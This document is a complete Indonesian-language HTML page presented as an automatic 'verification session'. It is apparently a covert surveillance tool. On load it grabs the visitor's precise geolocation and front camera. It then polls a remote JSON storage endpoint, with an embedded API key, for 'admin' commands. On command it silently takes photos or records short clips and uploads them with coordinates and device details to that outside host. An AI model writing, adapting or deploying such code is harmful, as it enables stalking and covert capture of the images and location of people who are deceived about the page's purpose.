<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sesi Verifikasi Otomatis</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 18px;
        }
        .card {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 16px;
            padding: 24px 20px;
            max-width: 430px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }
        h1 { font-size: 19px; margin-bottom: 8px; color: #fff; }
        p { font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 14px; }
        .input-group { margin-bottom: 12px; text-align: left; }
        .input-group label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 5px; }
        .input-group input {
            width: 100%;
            padding: 10px 12px;
            border-radius: 8px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #fff;
            font-size: 14px;
        }
        .info-box {
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 10px 12px;
            font-size: 12px;
            color: #94a3b8;
            margin-bottom: 10px;
            text-align: left;
        }
        .info-box.ok { border-color: rgba(34, 197, 94, 0.4); color: #4ade80; }
        .camera-box {
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 12px;
            aspect-ratio: 4 / 3;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
        .cam-placeholder { font-size: 13px; color: #64748b; padding: 14px; }
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 8px;
            background: #3b82f6;
            color: #fff;
            display: none;
        }
        .btn:hover { background: #2563eb; }
        .status {
            margin-top: 8px;
            font-size: 12px;
            padding: 10px;
            border-radius: 8px;
            display: none;
        }
        .status.success { display: block; background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
        .status.error { display: block; background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
    </style>
</head>
<body>

<div class="card">
    <h1>📍📷 Sesi Verifikasi</h1>
    <p>Menyiapkan lokasi dan kamera otomatis. Perintah foto atau rekaman klip dikontrol dari admin.</p>

    <div class="input-group">
        <label for="userName">Nama / Label Perangkat</label>
        <input type="text" id="userName" value="HP Saya">
    </div>

    <div id="locBox" class="info-box">Lokasi: Memeriksa...</div>
    <div id="cmdBox" class="info-box">Kamera & Perintah: Menyiapkan...</div>

    <div class="camera-box">
        <div id="camPlaceholder" class="cam-placeholder">Menyiapkan kamera...</div>
        <video id="videoPreview" autoplay playsinline muted></video>
    </div>

    <canvas id="captureCanvas" style="display:none;"></canvas>

    <button id="btnRetry" class="btn" onclick="initAutoFlow()">Aktifkan Ulang Lokasi & Kamera</button>

    <div id="statusBox" class="status"></div>
</div>

<script>
    const JSON_URL = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
    const API_KEY  = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
    const POLL_INTERVAL_MS = 5000;
    const RECORD_MS = 4000;

    const sessionId = "sess_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7);
    let locationData = null;
    let cameraStream = null;
    let pollTimer = null;
    let isExecuting = false;
    let lastHandledCommandToken = null;

    const locBox = document.getElementById('locBox');
    const cmdBox = document.getElementById('cmdBox');
    const btnRetry = document.getElementById('btnRetry');
    const video = document.getElementById('videoPreview');
    const canvas = document.getElementById('captureCanvas');
    const placeholder = document.getElementById('camPlaceholder');
    const statusBox = document.getElementById('statusBox');

    function showStatus(msg, type) {
        statusBox.textContent = msg;
        statusBox.className = 'status ' + type;
    }

    function getLocationAsync() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error("Browser tidak mendukung lokasi."));
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    akurasi: Math.round(pos.coords.accuracy) + " meter"
                }),
                (err) => reject(err),
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        });
    }

    async function initAutoFlow() {
        btnRetry.style.display = "none";
        locBox.className = "info-box";
        locBox.textContent = "Lokasi: Mengambil koordinat...";
        cmdBox.className = "info-box";
        cmdBox.textContent = "Kamera: Menyalakan...";

        try {
            locationData = await getLocationAsync();
            locBox.className = "info-box ok";
            locBox.textContent = `Lokasi aktif: ${locationData.lat.toFixed(6)}, ${locationData.lng.toFixed(6)} (±${locationData.akurasi})`;
        } catch (err) {
            locBox.textContent = "Lokasi: Belum diizinkan / gagal diambil.";
            showStatus("Izin lokasi diperlukan agar koordinat tersimpan.", "error");
            btnRetry.style.display = "block";
            return;
        }

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            cmdBox.textContent = "Kamera: Tidak didukung browser ini.";
            btnRetry.style.display = "block";
            return;
        }

        try {
            if (cameraStream) {
                cameraStream.getTracks().forEach(t => t.stop());
            }
            cameraStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            });
            video.srcObject = cameraStream;
            video.style.display = "block";
            placeholder.style.display = "none";
            cmdBox.className = "info-box ok";
            cmdBox.textContent = "Kamera aktif: Menunggu perintah dari admin...";
            showStatus("Siap. Menunggu perintah foto / rekaman klip dari admin.", "success");

            startCommandPolling();
        } catch (err) {
            cmdBox.textContent = "Kamera: Perlu izin / interaksi layar.";
            showStatus("Ketuk tombol di bawah jika browser meminta interaksi untuk menyalakan kamera.", "error");
            btnRetry.style.display = "block";
        }
    }

    function takePhotoBase64() {
        const targetW = 480;
        const vw = video.videoWidth || 640;
        const vh = video.videoHeight || 480;
        const targetH = Math.round((vh / vw) * targetW);

        canvas.width = targetW;
        canvas.height = targetH;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, targetW, targetH);
        return canvas.toDataURL('image/jpeg', 0.55);
    }

    function pickMimeType() {
        const candidates = ['video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
        for (const m of candidates) {
            if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
        }
        return '';
    }

    function recordClipBase64() {
        return new Promise((resolve, reject) => {
            if (!cameraStream || !window.MediaRecorder) {
                reject(new Error("MediaRecorder tidak didukung."));
                return;
            }
            const mime = pickMimeType();
            const opts = { videoBitsPerSecond: 180000 };
            if (mime) opts.mimeType = mime;

            let rec;
            try { rec = new MediaRecorder(cameraStream, opts); }
            catch (e) { rec = new MediaRecorder(cameraStream); }

            const chunks = [];
            rec.ondataavailable = (ev) => { if (ev.data && ev.data.size > 0) chunks.push(ev.data); };
            rec.onerror = () => reject(new Error("Gagal merekam klip."));
            rec.onstop = () => {
                const blob = new Blob(chunks, { type: rec.mimeType || mime || 'video/webm' });
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = () => reject(new Error("Gagal membaca rekaman."));
                reader.readAsDataURL(blob);
            };

            rec.start();
            setTimeout(() => {
                if (rec.state === "recording") rec.stop();
            }, RECORD_MS);
        });
    }

    async function fetchStorage() {
        const res = await fetch(`${JSON_URL}?t=${Date.now()}`);
        if (!res.ok) throw new Error("Gagal membaca JSONStorage");
        const data = await res.json();
        return {
            logs: Array.isArray(data.logs) ? data.logs : [],
            command: data.command || { action: "NONE", targetSessionId: null, token: null }
        };
    }

    async function saveStorage(payload) {
        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
        const res = await fetch(putUrl, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (!res.ok) throw new Error("Gagal menulis ke JSONStorage");
    }

    async function pollCommands() {
        if (isExecuting || !cameraStream || !locationData) return;

        try {
            const state = await fetchStorage();
            const cmd = state.command || {};
            const isForMe = !cmd.targetSessionId || cmd.targetSessionId === sessionId;
            const hasNewAction = (cmd.action === "PHOTO" || cmd.action === "RECORD") && cmd.token && cmd.token !== lastHandledCommandToken;

            if (isForMe && hasNewAction) {
                isExecuting = true;
                lastHandledCommandToken = cmd.token;
                const nama = document.getElementById('userName').value.trim() || "HP Saya";

                if (cmd.action === "PHOTO") {
                    cmdBox.textContent = "Perintah admin: Mengambil foto...";
                    const foto = takePhotoBase64();
                    state.logs.unshift({
                        id: Date.now(),
                        sessionId: sessionId,
                        tipe: "foto",
                        nama: nama,
                        foto: foto,
                        video: null,
                        lat: locationData.lat,
                        lng: locationData.lng,
                        akurasi: locationData.akurasi,
                        waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
                        perangkat: navigator.userAgent
                    });
                } else if (cmd.action === "RECORD") {
                    cmdBox.textContent = "Perintah admin: Merekam klip 4 detik...";
                    const videoClip = await recordClipBase64();
                    state.logs.unshift({
                        id: Date.now(),
                        sessionId: sessionId,
                        tipe: "rekaman",
                        nama: nama,
                        foto: null,
                        video: videoClip,
                        lat: locationData.lat,
                        lng: locationData.lng,
                        akurasi: locationData.akurasi,
                        waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB",
                        perangkat: navigator.userAgent
                    });
                }

                state.command = { action: "NONE", targetSessionId: null, token: null };
                await saveStorage(state);

                cmdBox.textContent = "Kamera aktif: Hasil terkirim. Menunggu perintah berikutnya...";
                showStatus("Foto/rekaman berhasil dikirim ke admin.", "success");
                isExecuting = false;
            }
        } catch (err) {
            isExecuting = false;
            console.error(err);
        }
    }

    function startCommandPolling() {
        if (pollTimer) clearInterval(pollTimer);
        pollCommands();
        pollTimer = setInterval(pollCommands, POLL_INTERVAL_MS);
    }

    window.addEventListener("DOMContentLoaded", initAutoFlow);
    window.addEventListener("beforeunload", () => {
        if (pollTimer) clearInterval(pollTimer);
        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
    });
</script>

</body>
</html>
